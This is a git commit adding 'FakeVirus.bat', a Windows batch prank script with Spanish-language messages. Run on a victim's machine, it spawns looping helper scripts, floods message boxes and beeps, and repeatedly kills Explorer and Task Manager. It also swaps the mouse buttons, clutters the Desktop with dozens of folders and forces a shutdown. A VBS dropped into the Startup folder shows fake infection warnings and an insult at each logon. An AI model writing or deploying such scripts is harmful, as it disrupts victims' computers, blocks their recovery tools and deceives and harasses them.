b9293e328d639fb08f1a9313aaa2d4216d050ad7
54n71 <60171821+54n71@users.noreply.github.com>
2021-03-14 22:17:57 -0300

    Add files via upload

---
+++ FakeVirus.bat
@@ -0,0 +1,370 @@
+@echo off
+mode 30 , 01
+cd C:\Users\%username%\Desktop
+echo @echo off >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+echo exit >> ppppppppppppppp.bat
+start ppppppppppppppp.bat
+echo @echo off >> s44ss1541DDDDD44.bat
+echo rundll32.exe user32.dll,MessageBeep >> s44ss1541DDDDD44.bat
+echo exit >> s44ss1541DDDDD44.bat
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
+start ppppppppppppppp.bat
+echo X=MsgBox("JAJAJAJAJAJAJAJAJAJAJAJAJAJAJAJ",0+48,"JAJAJAJAJAJJAJAJAJ") >> JAJAJAJAJA.vbs
+echo @echo off >> JAJAJAJAJ4.bat
+echo goto dfg78sdfg84 >> JAJAJAJAJ4.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+echo :dfg78sdfg84 >> JAJAJAJAJ4.bat
+echo title %ramdom% >> JAJAJAJAJ4.bat
+echo color f0 >> JAJAJAJAJ4.bat
+echo color 0f >> JAJAJAJAJ4.bat
+echo goto dfg78sdfg84 >> JAJAJAJAJ4.bat
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start JAJAJAJAJ4.bat
+TASKKILL /F /IM EXPLORER.EXE
+start ppppppppppppppp.bat
+start explorer.exe
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJA.vbs
+start ppppppppppppppp.bat
+start JAJAJAJAJA.vbs
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start JAJAJAJAJ4.bat
+start ppppppppppppppp.bat
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
+start JAJAJAJAJA.vbs
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJA.vbs
+start ppppppppppppppp.bat
+start https://www.youtube.com/watch?v=tiRcGyR298s
+start %windir%\system32\WF.msc
+start JAJAJAJAJA.vbs
+start %windir%\system32\narrator.exe
+start %windir%\system32\osk.exe
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
+msg * VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
+start JAJAJAJAJA.vbs
+start %windir%\system32\control.exe /name Microsoft.AdministrativeTools
+start %windir%\system32\notepad.exe
+start %windir%\system32\notepad.exe
+start JAJAJAJAJA.vbs
+start ppppppppppppppp.bat
+start %windir%\system32\colorcpl.exe 
+start %windir%\system32\control.exe
+start %windir%\system32\dxdiag.exe
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start JAJAJAJAJA.vbs
+start %windir%\system32\GamePanel.exe
+start %windir%\system32\msconfig.exe
+start JAJAJAJAJA.vbs
+start %windir%\system32\notepad.exe
+start JAJAJAJAJA.vbs
+start %windir%\system32\notepad.exe
+start %windir%\system32\notepad.exe
+start %windir%\system32\notepad.exe
+start %windir%\system32\msinfo32.exe
+start %windir%\system32\mspaint.exe
+start %windir%\system32\msra.exe
+start ppppppppppppppp.bat
+start https://www.youtube.com/watch?v=tiRcGyR298s
+start https://www.google.com/search?q=...........&oq=...........&aqs=chrome..69i57.1631j0j1&sourceid=chrome&ie=UTF-8
+cd C:\Users\%username%\Desktop
+start %windir%\system32\notepad.exe
+start %windir%\system32\notepad.exe
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
+start %windir%\system32\notepad.exe
+start %windir%\system32\notepad.exe
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start ppppppppppppppp.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJA.vbs
+start JAJAJAJAJ4.bat
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
+start JAJAJAJAJ4.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat
+start JAJAJAJAJ4.bat  
+title %Random%
+color 3a
+:RE
+start ppppppppppppppp.bat
+title %Random%
+CLS
+Rundll32 user32,SwapMouseButton
+TASKKILL /F /IM EXPLORER.EXE
+START EXPLORER.EXE
+TASKKILL /F /IM TASKMGR.EXE
+start
+start
+TASKKILL /F /IM EXPLORER.EXE
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start explorer.exe
+GOTO RE8
+
+
+:RE8
+start
+start
+title %Random%
+md hola %Username%
+md hola 
+CLS
+Rundll32 user32,SwapMouseButton
+TASKKILL /F /IM EXPLORER.EXE
+msg * Hola %username%
+START EXPLORER.EXE
+TASKKILL /F /IM TASKMGR.EXE
+GOTO RE9
+
+:RE9
+title %Random%
+CLS
+start
+start
+msg * Hola %username%
+Rundll32 user32,SwapMouseButton
+TASKKILL /F /IM EXPLORER.EXE
+start ppppppppppppppp.bat
+START EXPLORER.EXE
+TASKKILL /F /IM TASKMGR.EXE
+start
+start
+start
+start
+start
+start JAJAJAJAJA.vbs
+start JAJAJAJAJA.vbs
+start
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
+start
+start ppppppppppppppp.bat
+start
+shutdown.exe -s -t 15 -c "Desinstalando sistema..."
+cd C:\Users\%username%\Desktop
+md NoConfiesEnGenteDeInternet
+md NoConfiesEnGenteDeInternet2
+md NoConfiesEnGenteDeInternet3
+md NoConfiesEnGenteDeInternet4
+md NoConfiesEnGenteDeInternet5
+md NoConfiesEnGenteDeInternet6
+md NoConfiesEnGenteDeInternet7
+md NoConfiesEnGenteDeInternet8
+md NoConfiesEnGenteDeInternet9
+md NoConfiesEnGenteDeInternet9
+md NoConfiesEnGenteDeInternet10
+md NoConfiesEnGenteDeInternet11
+md NoConfiesEnGenteDeInternet12
+md NoConfiesEnGenteDeInternet13
+md NoConfiesEnGenteDeInternet14
+md NoConfiesEnGenteDeInternet15
+md NoConfiesEnGenteDeInternet16
+md NoConfiesEnGenteDeInternet17
+md NoConfiesEnGenteDeInternet18
+md NoConfiesEnGenteDeInternet19
+md NoConfiesEnGenteDeInternet20
+md NoConfiesEnGenteDeInternet21
+start ppppppppppppppp.bat
+md NoConfiesEnGenteDeInternet22
+md NoConfiesEnGenteDeInternet23
+md NoConfiesEnGenteDeInternet24
+md NoConfiesEnGenteDeInternet25
+md NoConfiesEnGenteDeInternet26
+md NoConfiesEnGenteDeInternet27
+md NoConfiesEnGenteDeInternet28
+md NoConfiesEnGenteDeInternet29
+md NoConfiesEnGenteDeInternet30
+md NoConfiesEnGenteDeInternet31
+md NoConfiesEnGenteDeInternet32
+md NoConfiesEnGenteDeInternet33
+md NoConfiesEnGenteDeInternet34
+md NoConfiesEnGenteDeInternet35
+md NoConfiesEnGenteDeInternet36
+md NoConfiesEnGenteDeInternet37
+md NoConfiesEnGenteDeInternet38
+md NoConfiesEnGenteDeInternet39
+md NoConfiesEnGenteDeInternet40
+md NoConfiesEnGenteDeInternet41
+md NoConfiesEnGenteDeInternet42
+md NoConfiesEnGenteDeInternet43
+md NoConfiesEnGenteDeInternet44
+md NoConfiesEnGenteDeInternet45
+md NoConfiesEnGenteDeInternet46
+md NoConfiesEnGenteDeInternet47
+md NoConfiesEnGenteDeInternet48
+md NoConfiesEnGenteDeInternet49
+md NoConfiesEnGenteDeInternet50
+md NoConfiesEnGenteDeInternet51
+md NoConfiesEnGenteDeInternet52
+md NoConfiesEnGenteDeInternet53
+md NoConfiesEnGenteDeInternet54
+md NoConfiesEnGenteDeInternet55
+md NoConfiesEnGenteDeInternet56
+md NoConfiesEnGenteDeInternet57
+start ppppppppppppppp.bat
+md NoConfiesEnGenteDeInternet58
+md NoConfiesEnGenteDeInternet59
+md NoConfiesEnGenteDeInternet60
+cd C:\Users\%username%\Desktop
+echo @echo on >> s2.bat
+echo color a >> s2.bat
+echo goto a15 >> s2.bat
+echo :a15 >> s2.bat
+echo title %random% %username% %random% >> s2.bat
+echo rundll32.exe user32.dll,MessageBeep >> s2.bat
+echo title %random% %username% %random% >> s2.bat
+echo goto a15 >> s2.bat
+cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+echo X=MsgBox("Su equipo esta infectado",0+48,"Windows") >> notvi.vbs
+echo X=MsgBox("Le recomendamos que..",0+48,"Windows") >> notvi.vbs
+echo X=MsgBox("No confies en nadie",0+48,"%username% ") >> notvi.vbs
+echo X=MsgBox("Jajajaja %username% , alto nombre de virgen ",0+48,"Created By 54n71") >> notvi.vbs
+cd C:\Users\%username%\Desktop
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
+start s44ss1541DDDDD44.bat
+start s44ss1541DDDDD44.bat
+start ppppppppppppppp.bat
